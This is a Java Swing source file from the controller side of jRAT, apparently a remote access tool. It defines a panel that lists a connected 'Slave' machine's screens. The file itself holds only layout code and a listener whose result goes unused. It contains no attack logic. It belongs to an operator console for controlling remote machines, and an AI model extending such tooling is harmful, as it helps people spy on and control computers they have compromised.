package io.jrat.client.ui.panels;

import io.jrat.client.Slave;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JScrollPane;
import javax.swing.ScrollPaneConstants;

import com.redpois0n.graphs.monitors.MonitorListener;
import com.redpois0n.graphs.monitors.PanelMonitors;
import com.redpois0n.graphs.monitors.PanelMonitors.PanelMonitor;
import com.redpois0n.graphs.monitors.RemoteMonitor;

@SuppressWarnings("serial")
public class PanelControlMonitors extends PanelControlParent {
	
	private PanelMonitors panelMonitors;

	public PanelControlMonitors(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 350, Short.MAX_VALUE));
		
		panelMonitors = new PanelMonitors(sl.getMonitors(), false);
		
		panelMonitors.addListener(new MonitorListener() {
			@Override
			public void onMonitorChange(RemoteMonitor monitor) {						
				PanelMonitor panel = null;
				
				for (PanelMonitor panel1 : panelMonitors.getPanels()) {
					if (panel1.getMonitor().equals(monitor)) {
						panel = panel1;
						break;
					}
				}
			}
		});
		scrollPane.setViewportView(panelMonitors);
		setLayout(groupLayout);
	}
}
